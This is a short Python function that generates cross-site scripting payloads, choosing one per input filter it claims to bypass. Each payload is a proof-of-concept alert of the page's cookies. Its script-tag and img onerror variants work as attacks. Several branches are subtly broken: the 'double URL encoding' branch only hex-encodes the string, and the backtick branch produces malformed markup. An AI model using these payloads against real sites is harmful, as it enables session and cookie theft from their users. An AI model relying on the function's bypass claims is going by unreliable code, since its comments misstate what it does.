import html

def craft_xss_payload(target_field: str, filter_type: str) -> str:
    # Basic XSS payload that alerts the document cookie
    basic_payload = "<script>alert(document.cookie)</script>"

    # Apply different filters
    if filter_type == "html_escape":
        # Double URL encoding to bypass HTML escaping
        return basic_payload.encode('utf-8').hex()
    elif filter_type == "script_tag":
        # Use event handlers instead of script tag
        return f'<img src="x" onerror="alert(document.cookie)"/>'
    elif filter_type == "quotes":
        # Use backticks or no quotes
        return f'<script{html.unescape("`")}alert(document.cookie){html.unescape("`")}></script>'
    else:
        # Default payload
        return basic_payload
